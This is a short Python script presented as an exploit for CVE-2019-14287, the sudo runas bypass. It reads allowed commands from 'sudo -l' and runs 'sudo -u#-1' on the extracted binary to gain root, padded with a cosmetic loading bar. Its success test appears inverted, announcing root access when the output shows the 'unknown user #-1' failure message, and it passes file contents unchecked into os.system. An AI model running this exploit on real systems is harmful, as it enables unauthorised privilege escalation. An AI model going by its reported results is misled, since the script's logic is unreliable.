#!/usr/bin/python3

import os
import time

print("-------------------------------")
print(" # CVE : 2019-14287 Exploit # ")
print("-------------------------------\n")
username = input("Enter current username : ")
print(f"*** Starting The Sudo Security Bypass Exploitation for User {username} !!!")

time.sleep(2)
def loading_bar(duration):
    bar_width = 50
    increment = duration / bar_width
    
    print("Trying to Exploit ... ...")
    for _ in range(bar_width):
        print("-", end="", flush=True)
        time.sleep(increment)
    
    print(" (done!!!)")

loading_bar(5)  # Example: 5 seconds

os.system("sudo -l > priv")
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
binary_file = open("binary")
binary= binary_file.read().strip()
os.system("sudo -u#-1 " + binary + "> ExploitFail")
ExploitFail = open("ExploitFail")
output = ExploitFail.read()
if "unknown user #-1" in output:
    print("You Successfully gained ROOT access !!!")
else:
    print("This is Not vulnerable :(")

print("all Done !!!")

